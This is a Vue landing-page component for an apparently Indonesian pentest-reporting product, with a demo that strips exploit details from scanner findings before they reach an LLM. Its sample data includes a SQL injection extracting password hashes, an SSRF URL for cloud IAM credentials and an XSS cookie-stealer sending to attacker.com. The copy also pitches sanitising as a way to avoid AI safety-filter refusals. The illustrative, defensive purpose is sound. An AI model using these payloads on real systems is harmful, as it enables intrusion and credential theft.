<template>
  <div class="flex flex-col min-h-screen">
    <Navbar />

    <!-- Hero Section -->
    <section class="relative overflow-hidden py-20 lg:py-28 border-b border-border bg-gradient-to-b from-blue-950/20 via-background to-background">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="text-center max-w-3xl mx-auto space-y-6">
          <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full border border-blue-500/20 bg-blue-500/10 text-blue-400 text-xs font-mono">
            <ShieldCheck class="h-3.5 w-3.5" />
            <span>GARANSI ARSITEKTUR ZERO-POC TO AI</span>
          </div>

          <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight text-white leading-tight">
            Pelaporan Kerentanan Cepat Tanpa Kebocoran Data
          </h1>

          <p class="text-base sm:text-lg text-zinc-400 leading-relaxed">
            Pangkas 35–50% waktu penyusunan laporan audit pentest. Satukan hasil Nmap & Nuclei secara otomatis, dengan jaminan matematis data sensitif klien tidak pernah diteruskan ke model AI komersial.
          </p>

          <div class="flex flex-col sm:flex-row items-center justify-center gap-4 pt-2">
            <router-link
              to="/contact"
              class="w-full sm:w-auto inline-flex items-center justify-center rounded-lg bg-blue-600 px-6 py-3 text-sm font-semibold text-white shadow-lg shadow-blue-500/20 hover:bg-blue-500 transition-all"
            >
              Simulasi Booking & Biaya Audit
              <ArrowRight class="ml-2 h-4 w-4" />
            </router-link>
            <router-link
              to="/about"
              class="w-full sm:w-auto inline-flex items-center justify-center rounded-lg border border-border bg-surface px-6 py-3 text-sm font-semibold text-zinc-300 hover:text-white hover:bg-surface-elevated transition-all"
            >
              Pelajari Arsitektur 4-Node
            </router-link>
          </div>
        </div>
      </div>
    </section>

    <!-- Split-Conduit Live Sandbox Demo (UC-01 Desweb) -->
    <section class="py-16 border-b border-border bg-surface/50">
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="text-center max-w-2xl mx-auto mb-10 space-y-2">
          <h2 class="text-2xl sm:text-3xl font-bold text-white tracking-tight">
            Live Sandbox: Split-Conduit Sanitizer
          </h2>
          <p class="text-sm text-zinc-400">
            Buktikan secara langsung bagaimana modul Sanitizer memfilter bukti eksploitasi mentah (PoC), IP privat, dan port sebelum diteruskan ke AI.
          </p>
        </div>

        <!-- Interactive Sandbox Card -->
        <div class="rounded-xl border border-border bg-surface-elevated overflow-hidden shadow-2xl">
          <!-- Control Bar -->
          <div class="p-4 border-b border-border bg-surface flex flex-wrap items-center justify-between gap-4">
            <div class="flex items-center space-x-3">
              <span class="text-xs font-mono font-semibold text-zinc-300">MODE SANITIZER:</span>
              <button
                @click="sanitizerActive = !sanitizerActive"
                :class="[
                  'relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none',
                  sanitizerActive ? 'bg-blue-600' : 'bg-zinc-700'
                ]"
              >
                <span
                  :class="[
                    'inline-block h-4 w-4 transform rounded-full bg-white transition-transform',
                    sanitizerActive ? 'translate-x-6' : 'translate-x-1'
                  ]"
                />
              </button>
              <span
                :class="[
                  'text-xs font-mono font-bold px-2 py-0.5 rounded border',
                  sanitizerActive
                    ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
                    : 'bg-red-500/10 text-red-400 border-red-500/20'
                ]"
              >
                {{ sanitizerActive ? 'ZERO-POC ENFORCED' : 'BYPASS (RISIKO LEAK)' }}
              </span>
            </div>

            <div class="flex items-center space-x-2 text-xs font-mono text-zinc-400">
              <span>SCANNER:</span>
              <select
                v-model="selectedSample"
                class="bg-background border border-border rounded px-2.5 py-1 text-xs text-white focus:outline-none focus:border-blue-500"
              >
                <option value="sqli">Nuclei: SQL Injection (CWE-89)</option>
                <option value="ssrf">Nuclei: SSRF Cloud Metadata (CWE-918)</option>
                <option value="xss">Nuclei: Stored XSS (CWE-79)</option>
              </select>
            </div>
          </div>

          <!-- Split Screen Canvas -->
          <div class="grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-border">
            <!-- Left Conduit: Raw Scanner Evidence (Database / Local Only) -->
            <div class="p-5 space-y-3 bg-zinc-950/60">
              <div class="flex items-center justify-between">
                <span class="text-xs font-mono font-semibold text-zinc-400 flex items-center gap-1.5">
                  <Database class="h-3.5 w-3.5 text-zinc-400" />
                  RAW EVIDENCE (TERSALIN DI VAULT LOKAL DB)
                </span>
                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-300">
                  AES-256-GCM
                </span>
              </div>

              <div class="rounded-lg bg-black/60 border border-zinc-800 p-3 font-mono text-xs text-zinc-300 space-y-2 overflow-x-auto">
                <div><span class="text-zinc-500">Target Host:</span> {{ currentSample.rawHost }}</div>
                <div><span class="text-zinc-500">Port:</span> {{ currentSample.rawPort }}</div>
                <div><span class="text-zinc-500">Endpoint:</span> {{ currentSample.rawEndpoint }}</div>
                <div class="text-red-400"><span class="text-zinc-500">Raw PoC Payload:</span> {{ currentSample.rawPoc }}</div>
                <div><span class="text-zinc-500">CWE Classification:</span> {{ currentSample.cwe }}</div>
                <div><span class="text-zinc-500">CVSS v3.1:</span> {{ currentSample.cvss }}</div>
              </div>
            </div>

            <!-- Right Conduit: Forwarded to AI LLM -->
            <div class="p-5 space-y-3 bg-zinc-950/90">
              <div class="flex items-center justify-between">
                <span class="text-xs font-mono font-semibold text-blue-400 flex items-center gap-1.5">
                  <Cpu class="h-3.5 w-3.5 text-blue-400" />
                  FORWARDED TO LLM (AI PROMPT BODY)
                </span>
                <span
                  :class="[
                    'text-[10px] font-mono px-2 py-0.5 rounded border',
                    sanitizerActive
                      ? 'bg-blue-500/10 text-blue-400 border-blue-500/20'
                      : 'bg-red-500/10 text-red-400 border-red-500/20'
                  ]"
                >
                  {{ sanitizerActive ? 'SANITIZED METADATA ONLY' : 'DATA LEAKAGE DETECTED!' }}
                </span>
              </div>

              <div
                :class="[
                  'rounded-lg border p-3 font-mono text-xs space-y-2 overflow-x-auto transition-colors',
                  sanitizerActive
                    ? 'bg-blue-950/10 border-blue-900/40 text-blue-200'
                    : 'bg-red-950/20 border-red-900/60 text-red-200'
                ]"
              >
                <div v-if="sanitizerActive">
                  <div class="text-emerald-400">// STRIPPED: Host, Port, Endpoint, Credentials, and PoC Attack Payloads</div>
                  <div><span class="text-zinc-500">title:</span> "{{ currentSample.title }}"</div>
                  <div><span class="text-zinc-500">cwe_id:</span> "{{ currentSample.cwe }}"</div>
                  <div><span class="text-zinc-500">cvss_score:</span> {{ currentSample.cvss }}</div>
                  <div><span class="text-zinc-500">severity:</span> "{{ currentSample.severity }}"</div>
                  <div class="text-zinc-400 pt-2 border-t border-zinc-800 text-[11px]">
                    Hasil AI: Narasi manajerial & saran mitigasi dihasilkan tanpa risiko penolakan AI Safety Guard!
                  </div>
                </div>
                <div v-else>
                  <div class="text-red-400 font-bold">// PERINGATAN: Muatan serangan & infrastruktur bocor ke pihak ketiga!</div>
                  <div class="line-through text-zinc-500">{{ currentSample.rawHost }} (IP PRIVAT BOCOR)</div>
                  <div class="text-red-300">{{ currentSample.rawPoc }} (Memicu AI Safety Filter Refusal)</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- 4 Key Architecture Pillars -->
    <section class="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <div class="p-6 rounded-xl border border-border bg-surface space-y-3">
          <div class="h-10 w-10 rounded-lg bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400">
            <Terminal class="h-5 w-5" />
          </div>
          <h3 class="text-base font-semibold text-white">CLI Agent Lokal</h3>
          <p class="text-xs text-zinc-400 leading-relaxed">
            Pemindaian berjalan mandiri di mesin pentester (Kali/macOS/Windows). Cloud SaaS tidak pernah memindai target klien secara langsung.
          </p>
        </div>

        <div class="p-6 rounded-xl border border-border bg-surface space-y-3">
          <div class="h-10 w-10 rounded-lg bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400">
            <Filter class="h-5 w-5" />
          </div>
          <h3 class="text-base font-semibold text-white">Scope & Karantina CIDR</h3>
          <p class="text-xs text-zinc-400 leading-relaxed">
            Enforcer otomatis mengarantina temuan di luar ROE (Rules of Engagement) klien demi perlindungan hukum kepatuhan pentest.
          </p>
        </div>

        <div class="p-6 rounded-xl border border-border bg-surface space-y-3">
          <div class="h-10 w-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
            <Sparkles class="h-5 w-5" />
          </div>
          <h3 class="text-base font-semibold text-white">CWE Fallback O(1)</h3>
          <p class="text-xs text-zinc-400 leading-relaxed">
            Katalog CWE in-memory memastikan laporan PDF tetap terbit seketika meski kuota API LLM habis atau koneksi timeout (EC-14).
          </p>
        </div>

        <div class="p-6 rounded-xl border border-border bg-surface space-y-3">
          <div class="h-10 w-10 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
            <FileText class="h-5 w-5" />
          </div>
          <h3 class="text-base font-semibold text-white">WeasyPrint Anti-SSRF</h3>
          <p class="text-xs text-zinc-400 leading-relaxed">
            Penyusun PDF mandiri berbasis HTML/CSS dengan SafeURLFetcher anti-DNS-rebinding memblokir akses ke IP internal dan metadata cloud.
          </p>
        </div>
      </div>
    </section>

    <Footer />
  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue'
import Navbar from '@/components/layout/Navbar.vue'
import Footer from '@/components/layout/Footer.vue'
import {
  ShieldCheck,
  ArrowRight,
  Database,
  Cpu,
  Terminal,
  Filter,
  Sparkles,
  FileText,
} from 'lucide-vue-next'

const sanitizerActive = ref(true)
const selectedSample = ref<'sqli' | 'ssrf' | 'xss'>('sqli')

const samples = {
  sqli: {
    title: 'SQL Injection in User Authentication Route',
    rawHost: '192.168.1.50',
    rawPort: 8080,
    rawEndpoint: '/api/v1/auth/login',
    rawPoc: "admin' UNION SELECT id, password_hash, token FROM users--",
    cwe: 'CWE-89',
    cvss: 9.8,
    severity: 'CRITICAL',
  },
  ssrf: {
    title: 'Server-Side Request Forgery via Avatar Importer',
    rawHost: 'internal.corp.local',
    rawPort: 443,
    rawEndpoint: '/profile/avatar?url=http://169.254.169.254/latest/meta-data/',
    rawPoc: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    cwe: 'CWE-918',
    cvss: 8.6,
    severity: 'HIGH',
  },
  xss: {
    title: 'Stored Cross-Site Scripting in Ticket Notes',
    rawHost: 'app.client.com',
    rawPort: 443,
    rawEndpoint: '/tickets/notes/create',
    rawPoc: '<script>document.location="http://attacker.com/steal?c="+document.cookie<\\/script>',
    cwe: 'CWE-79',
    cvss: 6.1,
    severity: 'MEDIUM',
  },
}

const currentSample = computed(() => samples[selectedSample.value])
</script>
